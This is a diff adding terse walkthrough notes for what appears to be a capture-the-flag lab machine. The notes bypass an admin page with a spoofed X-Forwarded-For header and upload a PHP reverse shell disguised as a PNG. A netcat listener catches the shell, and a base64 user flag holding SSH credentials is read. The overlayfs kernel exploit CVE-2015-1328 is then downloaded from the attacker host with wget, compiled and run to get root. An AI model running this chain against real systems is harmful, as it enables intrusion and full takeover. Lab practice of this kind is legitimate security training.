@@ -1,0 +1,114 @@
+
+#only 22 and 80 are open
+
+#http://172.16.33.74/adminstration/ this page is slow to access, maybe a proxy in the middel,
+#to bupass it, using X-Forwarded-For: 127.0.0.1, 
+#for the browser, a add-on plugin is useful.
+
+
+#upload a php reverseshell file to  http://172.16.33.74/adminstration/upload/.
+#and modified the Content-type to png
+
+Content-Length: 5824
+Origin: http://172.16.33.74
+Connection: close
+Referer: http://172.16.33.74/adminstration/upload/
+Cookie: PHPSESSID=sj1qgaduiqkbjldvvtofkg2520
+Upgrade-Insecure-Requests: 1
+X-Forwarded-For: 127.0.0.1
+
+-----------------------------21936179372951881946493793551
+Content-Disposition: form-data; name="document"; filename="p.php"
+Content-Type: image/png
+
+
+
+
+└─$ nc -nvlp 1234        
+listening on [any] 1234 ...
+connect to [10.8.0.17] from (UNKNOWN) [172.16.33.74] 59621
+Linux yousef-VirtualBox 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:08:14 UTC 2014 i686 athlon i686 GNU/Linux
+ 14:22:01 up 16 days, 22:14,  0 users,  load average: 0.00, 0.01, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+
+cat user.txt
+c3NoIDogCnVzZXIgOiB5b3VzZWYgCnBhc3MgOiB5b3VzZWYxMjM=
+
+
+
+www-data@yousef-VirtualBox:/home/yousef$ uname -a
+uname -a
+Linux yousef-VirtualBox 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:08:14 UTC 2014 i686 athlon i686 GNU/Linux
+www-data@yousef-VirtualBox:/home/yousef$ cat /etc/os*
+cat /etc/os*
+NAME="Ubuntu"
+VERSION="14.04, Trusty Tahr"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu 14.04 LTS"
+VERSION_ID="14.04"
+HOME_URL="http://www.ubuntu.com/"
+SUPPORT_URL="http://help.ubuntu.com/"
+BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
+
+└─$ searchsploit   linux 3.13
+
+Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege | linux/local/37292.c
+
+└─$ searchsploit   -m 37292.c
+  Exploit: Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation
+      URL: https://www.exploit-db.com/exploits/37292
+     Path: /usr/share/exploitdb/exploits/linux/local/37292.c
+    Codes: CVE-2015-1328
+ Verified: True
+File Type: C source, ASCII text, with very long lines (466)
+Copied to: /home/edk/Downloads/37292.c
+
+
+
+
+www-data@yousef-VirtualBox:/tmp$ wget http://10.8.0.17/37292.c
+wget http://10.8.0.17/37292.c
+--2022-11-16 16:49:02--  http://10.8.0.17/37292.c
+Connecting to 10.8.0.17:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 4968 (4.9K) [text/x-csrc]
+Saving to: '37292.c'
+
+100%[======================================>] 4,968       --.-K/s   in 0.001s  
+
+2022-11-16 16:49:02 (8.11 MB/s) - '37292.c' saved [4968/4968]
+
+www-data@yousef-VirtualBox:/tmp$ gcc 37292.c -o 37
+gcc 37292.c -o 37
+www-data@yousef-VirtualBox:/tmp$ ls -la
+ls -la
+total 64
+drwxrwxrwt  4 root     root      4096 Nov 16 16:49 .
+drwxr-xr-x 22 root     root      4096 Nov 25  2020 ..
+drwxrwxrwt  2 root     root      4096 Oct 30 16:07 .ICE-unix
+-r--r--r--  1 root     root        11 Oct 30 16:07 .X0-lock
+drwxrwxrwt  2 root     root      4096 Oct 30 16:07 .X11-unix
+-rwxrwxrwx  1 www-data www-data 12149 Nov 16 16:49 37
+-rw-rw-rw-  1 www-data www-data  4968 Jul 30  2024 37292.c
+-rw-r--r--  1 root     root     21569 Oct 30 16:07 vboxguest-Module.symvers
+www-data@yousef-VirtualBox:/tmp$ ./37
+./37
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+# id
+id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+# 
+
+cat root.txt
+WW91J3ZlIGdvdCB0aGUgcm9vdCBDb25ncmF0dWxhdGlvbnMgYW55IGZlZWRiYWNrIGNvbnRlbnQgbWUgdHdpdHRlciBAeTB1c2VmXzEx
